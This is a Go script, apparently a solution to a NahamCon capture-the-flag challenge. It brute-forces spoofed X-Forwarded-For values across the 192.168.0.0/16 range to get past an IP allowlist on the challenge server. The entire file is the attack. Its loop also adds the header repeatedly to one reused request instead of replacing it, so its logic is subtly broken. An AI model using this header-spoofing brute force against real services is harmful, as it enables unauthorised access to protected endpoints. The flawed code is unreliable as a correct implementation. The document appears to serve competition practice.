package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
)

func main() {

	url := "http://challenge.nahamcon.com:31428/"
	cli := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)

	for i := 0; i < 256; i++ {
		for j := 0; j < 256; j++ {
			ip := strings.Replace(strings.Replace("192.168.[].{}", "[]", strconv.Itoa(i), -1), "{}", strconv.Itoa(j), -1)
			req.Header.Add("X-Forwarded-For", ip)
			resp, _ := cli.Do(req)
			body, _ := ioutil.ReadAll(resp.Body)
			bodyString := string(body)
			if !strings.Contains(bodyString, "not accessible") {
				fmt.Println("Ip:", ip, "success!")
				os.Exit(1)
			}
			fmt.Println("Ip:", ip, "failed...")
		}
	}
}
